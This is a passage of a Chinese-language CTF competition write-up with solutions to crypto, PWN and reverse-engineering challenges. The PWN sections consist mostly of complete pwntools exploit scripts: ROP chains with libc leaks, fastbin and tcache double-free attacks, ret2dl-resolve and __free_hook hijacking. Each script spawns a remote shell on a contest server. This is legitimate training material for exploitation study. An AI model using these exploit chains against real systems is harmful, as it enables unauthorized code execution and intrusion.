Key map 为十六进制数，转换成二进制后发现为 768 位，即 16*48，是des加密的16轮子密钥，从网上找到 des 的解密脚本，修改一下即可解出  
![](https://i.loli.net/2019/04/22/5cbde46374018.png)  
![](https://i.loli.net/2019/04/22/5cbde4662ec7d.png)  

### Warmup
打开脚本查看加密逻辑，发现每次 nc连上服务器后会自动生成随机的16位key和4 位prefix、
suffix，再用 prefix 和 suffix 生成 64 位的 count，然后用 count 和 key 生成 cipher。服务得到
我的输入，在后面拼接正确的 flag 后进行 aes 加密并输出。测试一下服务  
![](https://i.loli.net/2019/04/22/5cbde4f2ab804.png)  
爆破即可  
```
#coding:utf-8
#__author__:wu1a
from pwn import *
import string
def boom(k,flag):
for i in range(k,len(string)):
payload = flag + string[i]
p.sendline(payload)
aaa = p.recvline()[17:].replace("\n","")
aaa = aaa[:(len(flag)+1)*2]
# print aaa
if aaa in flag_aes:
print "ok",payload
boom(0,payload)
else:
pass
# context.log_level='debug'
p = remote("fc32f84bc46ac22d97e5f876e3100922.kr-lab.com",12345)
string="{}" + string.ascii_lowercase + "-0123456789"
flag="flag"
p.recvuntil("Welcome to flag getting system\n")
p.sendline("")
flag_aes=p.recvline()[17:].replace("\n","")
log.info("flag_aes -> " + flag_aes)
boom(0,flag)
# p.interactive()
```
![](https://i.loli.net/2019/04/22/5cbde4fc52abb.png)  
### Asymmetric
打开加密脚本后发现过程类似 RSA 加密，尝试用 RSA 解密，先分解 n 得到  
![](https://i.loli.net/2019/04/23/5cbde508a116f.png)  
```
pP=1657407551907933046558545060527940723781810462521183676934573856328183290415
404194886254720077100621286329426643663835514524985415605387445829227138086113
201767704015876746181218857199538311224872809784181103805973587479154209280538
60076414097300832349400288770613227105348835005596365488460445438176193451867
R=4
```
根据欧拉函数 p**4-p**3 计算 n，再计算得到 flag
![](https://i.loli.net/2019/04/23/5cbde5184e85f.png)  

## PWN
**作者：warden、wu1a**
### your_pwn

可重复利用的单字节读写的漏洞.  

![](https://i.loli.net/2019/04/23/5cbde6ec9e932.png)

先直接读取栈上的返回地址泄露`pie`基址.  
然后构造`ROP`链打印库函数地址泄露`libc`.直接调用`system(binsh);`获得`flag`.  

```python
from pwn import *

context.log_level = 'debug'
pop_rdi_ret = 0xd03
pop_rsi_r15_ret = 0xd01
#r = process("./pwn")
r = remote("1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com","57856")

r.recvuntil("name:")
r.sendline("w4rd3n")

def get(p):
    i = 0
    ll = 0
    while(1):
        r.recvuntil("index\n")
        r.sendline(str(i + p))
        data = r.recvuntil("value\n")[:-17]
        data = int(data[-2:],16)
        if(i < 8):
            ll += data * (0x100 ** i)
        r.sendline(str(data))
        i += 1
        if(i % 41 == 0):
            r.recvuntil("continue(yes/no)? \n")
            r.sendline("yes")
            return ll

def write(p, x):
    i = 0
    while(1):
        r.recvuntil("index\n")
        r.sendline(str(i + p))
        r.recvuntil("value\n")
        data = 0
        if(i != 40):
            data = (x[i/8] / (0x100 ** (i % 8))) % 0x100
        r.sendline(str(data))
        i += 1
        if(i % 41 == 0):
            r.recvuntil("continue(yes/no)? \n")
            r.sendline("yes")
            return

pie = get(0x158) - 0xb11
print "pie: " + hex(pie)

write(0x158, [pie + pop_rdi_ret, pie + 0x202020, pie + 0x8B0, pie + 0xb0c, 0, 0, 0, 0])

libc = u64(r.recvuntil("\n")[0:6].ljust(8,'\0')) - 0x06f690
print "libc: " + hex(libc)

system = libc + 0x045390
binsh = libc + 0x18cd57

write(0x158, [pie + pop_rdi_ret, binsh, system, 0, 0, 0, 0, 0])

r.interactive()
```

### daily

`remove`的时候没有对`index`进行范围检测.  

![](https://i.loli.net/2019/04/23/5cbde706ee0aa.png)  

先利用`unsorted bin`泄露`libc`,再利用`fastbin`单链表泄露`heap`基址.

申请一个`chunk`,在里面伪造一个堆指针和对应的`faker chunk`.  
`free`掉这个`faker chunk`,通过`edit`构造其`fd`到`bss`上,由于`length`可控,通过`remove`构造出一个`chunk`头部绕过检查.  
成功`fastbin attack`,获得任意读写的能力,由于程序开了`Full RELRO`所以劫持`__free_hook`调用`system(binsh);`获得`flag`.

```python
from pwn import *

context.log_level = 'debug'
#r = process("./pwn")
ptr = 0x602060
r = remote("85c3e0fcae5e972af313488de60e8a5a.kr-lab.com", "58512")

def show():
    r.sendline(str(1))
    data = r.recvuntil("Your choice:")
    return data

def add(length, content):
    r.sendline(str(2))
    r.recvuntil("of daily:")
    r.sendline(str(length))
    r.recvuntil("daily\n")
    r.send(content)
    r.recvuntil("Your choice:")

def edit(index, content):
    r.sendline(str(3))
    r.recvuntil("of daily:")
    r.sendline(str(index))
    r.recvuntil("daily\n")
    r.send(content)
    r.recvuntil("Your choice:")

def remove(index):
    r.sendline(str(4))
    r.recvuntil("of daily:")
    r.sendline(str(index))
    r.recvuntil("Your choice:")

r.recvuntil("Your choice:")

add(0x100, 'a')#0
add(0x100, 'b')#1
add(0x100, 'c')#2
add(0x100, 'd')#3
remove(0)
remove(2)
add(0x100, 'a' * 8)#0
add(0x100, 'a' * 8)#2

r.sendline(str(1))
r.recvuntil("aaaaaaaa")
heap = u64(r.recvuntil("1 :")[:-3].ljust(8,'\0')) - 0x220
r.recvuntil("aaaaaaaa")
libc = u64(r.recvuntil("3 :")[:-3].ljust(8,'\0')) - 0x3c4b78

print "heap: " + hex(heap)
print "libc: " + hex(libc)

remove(0)
remove(1)
remove(2)
remove(3)

add(0x60, p64(heap + 0x30) * 2 + p64(0) + p64(0x51))#0
add(0x20, 'a')#1
add(0x50, 'a')#2
add(0x20, 'a')#3
remove((heap + 0x18 - ptr - 8) / 0x10)
edit(0, p64(0) * 3 + p64(0x51) + p64(ptr + 0x18))
remove(1)
add(0x40, 'a')#1
add(0x40, 'a')#4
edit(4, p64(ptr))
edit(2, p64(0x100) + p64(ptr) + p64(0) * 4)
edit(0, p64(0x100) + p64(ptr) + p64(0x100) + p64(libc + 0x3c67a8) + p64(0x100) + p64(libc + 0x18cd57))
edit(1, p64(libc + 0x045390))

#gdb.attach(r)
r.sendline(str(4))
r.recvuntil("of daily:")
r.sendline(str(2))

r.interactive()
```

### baby_pwn

`ret2dl in x86`,没有可供`leak`的函数.保护很少,想起之前的`0ctf2018 babystack`,修改脚本直接打.  

```python
import sys
import roputils
from pwn import *

context.log_level = 'debug'
#r = process("./pwn")
r = remote("c346dfd9093dd09cc714320ffb41ab76.kr-lab.com", "56833")

rop = roputils.ROP('./pwn')
addr_bss = rop.section('.bss')

buf1 = 'A' * 0x2c
buf1 += p32(0x8048390) + p32(0x804852D) + p32(0) + p32(addr_bss) + p32(100)
r.send(buf1)

buf2 =  rop.string('/bin/sh')
buf2 += rop.fill(20, buf2)
buf2 += rop.dl_resolve_data(addr_bss + 20, 'system')
buf2 += rop.fill(100, buf2)
r.send(buf2)

buf3 = 'A' * 0x2c + rop.dl_resolve_call(addr_bss + 20, addr_bss)
r.send(buf3)

#gdb.attach(r)

r.interactive()
```

### Virtual

理解程序逻辑.  

![](https://i.loli.net/2019/04/23/5cbde7182263f.png)

首先是`store_instruction`函数将输入通过分隔符分类为各种操作符并保存在堆中,`store_num`同理.  
其中三个堆块一个数据堆,一个操作符堆,一个栈(也是用来存数据的,存储操作符操作的数据).

重点就是`op`函数.

![](https://i.loli.net/2019/04/23/5cbde72e30ae4.png)

这里不断从操作符堆取出操作符(对应的数字),然后跳转到函数执行的地方,这里`IDA`反汇编有问题,没有识别出函数调用,实际上`i`会被赋值为函数调用的返回值.

这些函数操作栈中的数据并将结果放回栈中,所以使用数据前需要先`push`.

关键函数是`load`和`save`,知道偏移就可以任意读写.  
先使用`load`泄露堆上的堆地址,由于没开`pie`,通过`-`和`/`求出`.got[puts]`和此处偏移,再次`load`泄露`libc`,处理与`system`的偏移获得`system`地址.  
不过这里没办法复制保存数据,只能移动和计算,所以之前的偏移没了,通过同样操作调整一下再次获得`.got[puts]`偏移,调用`save`成功劫持`puts@plt`.  
突然发现`username`作用,开始试了`/bin/sh`,`ls`,`cat flag`什么的都是`comment not found`,最后`/bin/bash`成功.

```python
from pwn import *

#context.log_level = 'debug'
#r = process("./pwn")
r = remote("a569f7135ca8ce99c68ccedd6f3a83fd.kr-lab.com", "40003")

r.recvuntil("Your program name:\n")
r.sendline("/bin/bash")

r.recvuntil("Your instruction:\n")
payload = "push push push load push sub div sub load push add"
payload += " push push push load push sub div sub save"
#payload = "push push push load push sub div sub load pop"
r.sendline(payload)

#gdb.attach(r)

r.recvuntil("Your stack data:\n")
#payload = "-1 8 -5 4210720"
payload = "-1 8 -5 4210720 -172800 -1 8 -6 4210720"
#0x404020 = 4210720,offset = -172800,one_gadget = -173178
r.sendline(payload)

#print r.recv()

r.interactive()
```

### bms

远端环境是`libc2.26`,可以使用`tcache`攻击,利用`double free`把`chunk`分配在`stdout`附近,使`tcache bin`指向`_IO_2_1_stdout_`.

修改结构体泄露`libc`,再次使用`tcache`攻击分配`chunk`到`__free_hook`,劫持为`one_gadget`,调用`free`获得`shell`.

![](https://i.loli.net/2019/04/23/5cbde7238db45.png)

```python
from pwn import *

context.log_level = 'debug'
#r = process("./pwn")
r = remote("39.106.224.151", "60002")

def add(name, length, content):
    r.send(str(1))
    r.recvuntil("book name:")
    r.send(name)
    r.recvuntil("description size:")
    r.send(str(length))
    r.recvuntil("description:")
    r.send(content)
    r.recvuntil(">\n")

def remove(index):
    r.sendline(str(2))
    r.recvuntil("index:")
    r.sendline(str(index))
    r.recvuntil(">\n")

r.recvuntil("username:")
r.send("admin\n\x00")
r.recvuntil("password:")
r.send("frame\n\x00")

r.recvuntil(">\n")

add("a", 0xf0, "a")#0
remove(0)
remove(0)
add("a", 0xf0, p64(0x602020))#1
add("a", 0xf0, p64(0x602020))#2
add("a", 0xf0, p8(0x20))#3
r.send(str(1))
r.recvuntil("book name:")
r.send("a")
r.recvuntil("description size:")
r.send(str(0xf0))
r.recvuntil("description:")
r.send(p64(0xfbad2887) + p64(0x601F70) * 4)#4

libc = u64(r.recvuntil(">\n")[:6].ljust(8, '\0')) - 0x78460

add("a", 0xe0, "a")#5
remove(5)
remove(5)
add("a", 0xe0, p64(libc + 0x3dc8a8))#6
add("a", 0xe0, p64(libc + 0x3dc8a8))#7
add("a", 0xe0, p64(libc + 0x47c46))#8

r.sendline(str(2))
r.recvuntil("index:")
r.sendline(str(5))

#gdb.attach(r)
print "libc: " + hex(libc)

r.interactive()
```
### double
这题的点找了好久，一直没 get 到，（没注意题目名，手动滑稽），研究了各种姿势，回原点，两个同样的文件释放会报 double free 的错，才发现自己漏看了一块地方，然后利用文件内容一致，引用同一文件。实现 double free。然后 fastbin attack再次 diss，主办方的 check 竟然 system(“sh”) ，命令在容器里啥权限都没，还不让我过，搞得我只好找 onegadget  
```
from pwn import *
context.log_level = "debug" p = process("./pwn")
p = remote("e095ff54e419a6e01532dee4ba86fa9c.kr-lab.com",40002)
elf = ELF('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def add(content):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('Your data:\n')
    p.send(content)
def edit(index,content):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('Info index: ')
    p.sendline(str(index))
    p.send(content)
def show(index):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('Info index: ')
    p.sendline(str(index))
def delete(index):
    p.recvuntil('> ')
    p.sendline('4')
    p.sendline(str(index))
add(0x50*'s'+'\n')
add(0x60*'s'+'\n')
add(0x60*'s'+'\n')
add(0x60*'b'+'\n')
delete(1)
delete(3)
delete(2)
add(p64(0x4040bd).ljust(0x60,'c')+'\n')
add(0x60*'n'+'\n')
add(0x60*'m'+'\n')
payload = 'd'*3 + p64(0x4040e0) + p64(0x4040f0) + p32(0) + p32(20) +
p64(elf.got['read'])+p64(0x4040f0)
add((0x60*'\x00')+'\n')
edit(0,payload+'\n')
show(0)
readaddr = u64(p.recv(6).ljust(8,'\x00'))
libcaddr = readaddr - libc.symbols['read']
print "libc---->",hex(libcaddr)
edit(0,p64(libcaddr + 0x4526a)+'\n')
p.sendline('icqf3f12bdf6e59569e295aacbd704b2')
p.interactive()
```
## Reverse
**作者：lizhirui、impakho**
### bbvvmm
一道考察虚拟机和加密算法的逆向题。大致流程如下。

![](https://impakho.com/images/E808D0E80F43F08B253626FD53FA6CEA.png)

输入用户名和密码，用户名和密码会被分开校验。

用户名为 8字节 长度，先被 `bin2hex` 处理变成 16字节 长度。

`sm4_keyext` 进行密钥扩展，与处理后的用户名一起参与 `sm4` 加密。

加密结果进行 `bin2hex` 处理，再进行一个被修改过编码表的 `base64` 编码，最后比较 `base64` 的内容。

结合网上的代码进行修改，写出这部分的解密代码，得到用户名：`badrer12`。
```
import string

base64_charset = 'IJLMNOPKABDEFGHCQRTUVWXSYZbcdefa45789+/6ghjklmnioprstuvqwxz0123y'

def b64encode(origin_bytes):
    base64_bytes = ['{:0>8}'.format(str(bin(b)).replace('0b', '')) for b in origin_bytes]

    resp = ''
    nums = len(base64_bytes) // 3
    remain = len(base64_bytes) % 3

    integral_part = base64_bytes[0:3 * nums]
    while integral_part:
        tmp_unit = ''.join(integral_part[0:3])
        tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]]
        resp += ''.join([base64_charset[i] for i in tmp_unit])
        integral_part = integral_part[3:]

    if remain:
        remain_part = ''.join(base64_bytes[3 * nums:]) + (3 - remain) * '0' * 8
        tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1]
        resp += ''.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * '='

    return resp


def b64decode(base64_str):
    base64_bytes = ['{:0>6}'.format(str(bin(base64_charset.index(s))).replace('0b', '')) for s in base64_str if
                    s != '=']
    resp = bytearray()
    nums = len(base64_bytes) // 4
    remain = len(base64_bytes) % 4
    integral_part = base64_bytes[0:4 * nums]

    while integral_part:
        tmp_unit = ''.join(integral_part[0:4])
        tmp_unit = [int(tmp_unit[x: x + 8], 2) for x in [0, 8, 16]]
        for i in tmp_unit:
            resp.append(i)
        integral_part = integral_part[4:]

    if remain:
        remain_part = ''.join(base64_bytes[nums * 4:])
        tmp_unit = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)]
        for i in tmp_unit:
            resp.append(i)

    return resp

Sbox = [
    [0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05],
    [0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99],
    [0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62],
    [0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6],
    [0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8],
    [0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35],
    [0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0x78, 0x87],
    [0xD4, 0x00, 0x46, 0x57, 0x9F, 0xD3, 0x27, 0x52, 0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E],
    [0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1],
    [0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3],
    [0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F],
    [0xD5, 0xDB, 0x37, 0x45, 0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51],
    [0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8],
    [0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0],
    [0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84],
    [0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48]
]

CK = [
    0x00070e15L, 0x1c232a31L, 0x383f464dL, 0x545b6269L,
    0x70777e85L, 0x8c939aa1L, 0xa8afb6bdL, 0xc4cbd2d9L,
    0xe0e7eef5L, 0xfc030a11L, 0x181f262dL, 0x343b4249L,
    0x50575e65L, 0x6c737a81L, 0x888f969dL, 0xa4abb2b9L,
    0xc0c7ced5L, 0xdce3eaf1L, 0xf8ff060dL, 0x141b2229L,
    0x30373e45L, 0x4c535a61L, 0x686f767dL, 0x848b9299L,
    0xa0a7aeb5L, 0xbcc3cad1L, 0xd8dfe6edL, 0xf4fb0209L,
    0x10171e25L, 0x2c333a41L, 0x484f565dL, 0x646b7279L
]

FK = [0xA3B1BAC6L, 0x56AA3350L, 0x677D9197L, 0xB27022DCL]

def LeftRot(n, b): return (n << b | n >> 32 - b) & 0xffffffff

def t(a):
    a4=a>>4
    a3=a4>>4
    a2=a3>>8
    a1=a2>>8
    return (Sbox[a1>>4][a1&0xf] << 24) + \
           (Sbox[a2>>4&0xf][a2&0xf] << 16) + \
           (Sbox[a3>>4&0xf][a3&0xf] << 8) + \
           Sbox[a4&0xf][a&0xf]

def F(xi, rki):
    B=t(xi[1]^xi[2]^xi[3]^rki)
    return xi[0] ^ B^LeftRot(B,2)^LeftRot(B,10)^LeftRot(B,18)^LeftRot(B,24)

def T_(A):
    B=t(A)
    return B^LeftRot(B,13)^LeftRot(B,23)

def sm4(X,K,rev=0):
    tmp_K=K[4:]
    if rev==1: tmp_K=tmp_K[::-1]
    for i in xrange(32):
        X = [X[1], X[2], X[3], F(X, tmp_K[i])]
    return X[::-1]

def lbc(i):
    tmp=hex(i)[2:]
    if tmp[-1]=='L': tmp=tmp[:-1]
    if len(tmp)%2==1: tmp='0'+tmp
    tmp=tmp.decode('hex')[::-1]
    return int(tmp.encode('hex'),16)

enc = str(b64decode('RVYtG85NQ9OPHU4uQ8AuFM+MHVVrFMJMR8FuF8WJQ8Y='))
m = int(enc,16)
key = 0xD60D29FD0B3A70A553B72A31DAF198DA

X=[m >> (128-32),(m >> (128-32*2))&0xffffffff,(m >> 32)&0xffffffff,m&0xffffffff]
Y=[lbc(key >> (128-32)),lbc((key >> (128-32*2))&0xffffffff),lbc((key >> 32)&0xffffffff),lbc(key&0xffffffff)][::-1]
K=[Y[i]^FK[i] for i in xrange(4)]
for i in xrange(32):
    K.append(K[i]^T_(K[i+1]^K[i+2]^K[i+3]^CK[i]))

X=sm4(X,K,1)
username=''
for i in xrange(4):
    username += hex(X[i])[2:-1].decode('hex').decode('hex')
print username
```
除了已经得到的用户名，还需要得到密码才能登录进去拿到 Flag。

这里要求输入 6 字节的密码，然后放到 ptr + 4 * (i + 0x24LL) 处。而这个 ptr 是在初始化虚拟机的时候定义的。虚拟机运行完毕，`*((_DWORD *)ptr + 0x19)` 要等于 0。

现在开始分析这个虚拟机的构造。

![](https://impakho.com/images/09A544A5F59C9B999548EF6085E5C533.png)

这里初始化了虚拟寄存器，基于物理堆实现的虚拟栈，虚拟机指令及其对应的处理函数，虚拟指令表等。

![](https://impakho.com/images/D9F2EEC22C69B302F6B302788CEE4D9A.png)

这是虚拟机运行时，需要执行的虚拟指令表。

![](https://impakho.com/images/02192FECAB37FA43C5B03B7A5F338DA5.png)

这是一条执行虚拟机指令表的循环语句，结束标志为 0xFF。刚好对应上虚拟指令表最后一个指令。

到这里就需要启动 `人肉虚拟机指令翻译器`，它能够结合指令处理函数和指令表，将每一条指令翻译成伪汇编语句。
```

B0 19 00 00 00:          push 0x19
B5 0A:                   pop r6
B2 0B:                   push r7
B4 09:                   pop ptr[r6]
B0 1A 00 00 00:          push 0x1A
B5 0A:                   pop r6
04 0B 09:                r7=ptr[r6]
B0 1A 00 00 00:          push 0x1A
B5 0A:                   pop r6
B2 0B:                   push r7
B4 09:                   pop ptr[r6]
90 C2 00 00 00:          jmp 0xC2
91:                      jmp next
01 1A 00 00 00 0A:       r6=0x1A
02 09 00:                r1=ptr[r6]
10 09 30 00 00 00 01:    r2=&ptr[0x30]
B2 01:                   push r2
B2 00:                   push r1
C0:                      *(s0r-1)+=*(s0r-2)
B5 00:                   pop r1
B0 F4 FF FF FF:          push 0xFFFFFFF4
B5 0A:                   pop r6
B1 00:                   push r1[r6]
B5 01:                   pop r2
01 1A 00 00 00 0A:       r6=0x1A
B1 09:                   push ptr[r6]
B5 00:                   pop r1
10 00 78 00 00 00 00:    r1+=0x78
70 00 FF 00 00 00 00:    r1&=0xFF
50 00 18 00 00 00 00:    r1<<=0x18
B2 00:                   push r1
B0 18 00 00 00:          push 0x18
C8:                      *(s0r-1)=*(s0r-2)>>*(s0r-1)
B5 00:                   pop r1
B2 01:                   push r2
B2 00:                   push r1
C3:                      *(s0r-1)^=*(s0r-2)
B5 00:                   pop r1
50 00 18 00 00 00 00:    r1<<=0x18
B2 00:                   push r1
B0 18 00 00 00:          push 0x18
C8:                      *(s0r-1)=*(s0r-2)>>*(s0r-1)
B5 00:                   pop r1
70 00 FF 00 00 00 01:    r2=0xFF&r1
01 19 00 00 00 0A:       r6=0x19
02 09 00:                r1=ptr[r6]
11 01 00 00:             r1+=r2
B0 19 00 00 00:          push 0x19
B5 0A:                   pop r6
B2 00:                   push r1
B4 09:                   pop ptr[r6]
01 1A 00 00 00 0A:       r6=0x1A
B1 09:                   push ptr[r6]
B5 00:                   pop r1
10 00 01 00 00 00 00:    r1+=0x01
01 1A 00 00 00 0A:       r6=0x1A
04 00 09:                ptr[r6]=r1
B0 1A 00 00 00:          push 0x1A
B5 0A:                   pop r6
02 09 00:                r1=ptr[r6]
86 00 06 00 00 00 00:    r1=r1<0x06
88 00 26 00 00 00 r1:    jnz 0x26
91:                      jmp 0x1
FF:                      exit
```
不过这样还是有点难看懂，那不妨将 `人肉虚拟机指令翻译器`` 的功率调大，让它输出更加美妙而神奇的代码。
```
ptr_0x1A=0
password='******'
for i in range(0x06):
    ptr_0x1A+=ord(password[i])^(0x78+i)
```
这样的代码具有很强的艺术观赏性。怀着美好的心情，掐指一算密码就是 `xyz{|}`。

借助 `自然之力` 登录进去，顺利拿到 `pizza大佬` 留下的丰厚宝藏：`pizza's原味flag` 一枚。

```
from pwn import *

io=remote('39.106.224.151', 10001)
io.send('badrer12\n')
io.send('xyz{|}')
io.interactive()
```

>Flag: flag{eafd_134g_vp1d_vsdr_v5yg_ai0g_fsdg_g24t_sdfg}

### easygo
根据题目名称和 IDA 结合来看，猜测是一个 go 写的程序。

程序的符号信息被去除了，用 `IDAGolangHelper` 恢复符号信息。

![](https://impakho.com/images/F774497E5CC2BA46689BA02BEAB17365.png)

![](https://impakho.com/images/051E1A19A6542EEABC34E7DC04D966B1.png)

然后看` main_main` 函数，在` encoding_base64__ptr_Encoding_DecodeString` 处下断点。

![](https://impakho.com/images/6180FA3F12D9A97EE52E6C6FF96BBF58.png)

单步调试到这里，跟进 rsi 地址的内存数据，就能看到 flag 了。

>Flag: flag{92094daf-33c9-431e-a85a-8bfbd5df98ad}

### strange_int
篇幅问题，请移步：https://www.52pojie.cn/thread-936377-1-1.html

# 评论区
**请文明评论，禁止广告**
<img src="https://cloud.panjunwen.com/alu/扇耳光.png" alt="扇耳光.png" class="vemoticon-img">  

---

<div class="comment"></div>
<script src="//cdn.staticfile.org/jquery/3.4.0/jquery.min.js"></script>
<script src="../js/av-min.js"></script>
<script src='../js/Valine.min.js'></script>
<script src="../js/Valine.js"></script>